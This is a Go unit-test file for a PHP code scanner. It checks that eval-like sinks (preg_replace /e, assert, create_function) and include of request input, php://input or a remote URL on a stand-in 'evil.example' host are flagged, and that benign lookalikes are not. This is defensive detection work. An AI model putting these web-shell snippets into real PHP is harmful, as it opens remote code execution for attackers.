package checks

import (
	"strings"
	"testing"
)

const (
	indPregReplaceEval = "preg_replace with /e modifier (code execution)"
	indDangerousInc    = "include/require of request input or remote/data wrapper"
	indCodeEvalPrim    = "code-eval primitive (assert/create_function) with request input"
)

// --- preg_replace /e modifier (legacy eval sink, removed in PHP 7) ---

func TestAnalyzePHPContentPregReplaceEvalFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/.*/e', $_POST['c'], $subject); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalAltDelimiterFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('~payload~ie', $r, $s); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace ~..~ie not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalPairedDelimitersFlagged(t *testing.T) {
	for _, pattern := range []string{"{payload}e", "(payload)e", "[payload]e", "<payload>e"} {
		res := analyzePHPString(t, "<?php preg_replace('"+pattern+"', $r, $s); ?>")
		if !strings.Contains(res.details, indPregReplaceEval) {
			t.Errorf("preg_replace %q not flagged; details=%q", pattern, res.details)
		}
	}
}

func TestAnalyzePHPContentPregReplaceNoEvalNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/i', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("plain preg_replace wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceUppercaseEModifierNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/E', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("uppercase E modifier wrongly treated as eval; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalInStringNotFlagged(t *testing.T) {
	// A documentation/string example must not trip the scanner.
	res := analyzePHPString(t, "<?php $doc = \"preg_replace('/a/e', ...) is dangerous\"; echo $doc; ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e inside a string literal wrongly flagged; details=%q", res.details)
	}
}

// --- include/require of request input or remote/data wrappers (LFI/RFI) ---

func TestAnalyzePHPContentIncludeRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include($_GET['page'].'.php'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMultilineRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include(\n$_GET['page'].'.php'\n); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("multiline include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludePHPWrapperFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include 'php://input'; ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of php:// wrapper not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentRequireRemoteFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once('http://evil.example/x.txt'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("require of remote URL not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once ABSPATH . 'wp-load.php'; include __DIR__.'/config.php'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNextLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php';\n$page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with next-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRemoteStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $url = 'http://example.test/feed'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated remote string wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeVariableNameNotFlagged(t *testing.T) {
	// A variable named $include fed request input is not an include statement.
	res := analyzePHPString(t, "<?php $include = $_GET['x']; echo $include; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("variable named $include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMethodNameNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $loader->include($_GET['x']); ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("method named include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"include $_GET['page']\"; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include inside string literal wrongly flagged; details=%q", res.details)
	}
}

// --- assert / create_function code-eval primitives with request input ---

func TestAnalyzePHPContentAssertRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert ($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function ('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNoRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert without request input wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertSameLineUnrelatedRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with unrelated same-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"assert($_GET['code'])\"; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert inside string literal wrongly flagged; details=%q", res.details)
	}
}
